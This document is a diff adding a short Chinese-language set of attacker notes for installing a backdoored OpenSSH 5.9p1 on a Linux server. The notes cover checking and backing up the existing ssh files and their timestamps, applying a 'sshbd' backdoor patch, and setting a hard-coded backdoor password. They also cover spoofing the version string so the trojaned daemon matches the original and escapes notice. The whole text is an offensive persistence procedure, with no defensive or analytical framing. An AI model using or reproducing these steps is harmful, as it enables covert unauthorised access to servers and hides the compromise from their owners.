@@ -1,0 +1,33 @@
+ssh -V
+查看当前的ssh版本信息
+
+查找ssh
+一般都在/etc/ssh
+
+备份原来的文件的time
+将/etc/ssh下的文件的备份
+
+wget存在后门的ssh
+#http://openbsd.org.ar/pub/OpenBSD/OpenSSH/portable/ 正规的ssh源文件
+#openssh-5.9p1.tar
+#openssh-5.9p1.path.tar
+
+tar zxf openssh-5.9p1.tar
+tar zxf openssh-5.9p1.path.tar
+cp openssh-5.9p1.patch/sshbd5.9pl.diff /openssh-5.9pl
+cd openssh-5.9p1
+patch < sshbd5.9p1.diff
+
+修改ssh信息
+vi includes.h
+##define SECRETPW "sky" 后门的密码
+
+vi version.h
+#define SSH_VERSION "OpenSSH_5.8pl Debian-lubuntu3"
+#修改为第一步ssh -V 查看到的信息
+#define SSH_PORTABLE "p1"
+
+源码编译
+yum install -y openssl openssl-devel pam-devel
+
+
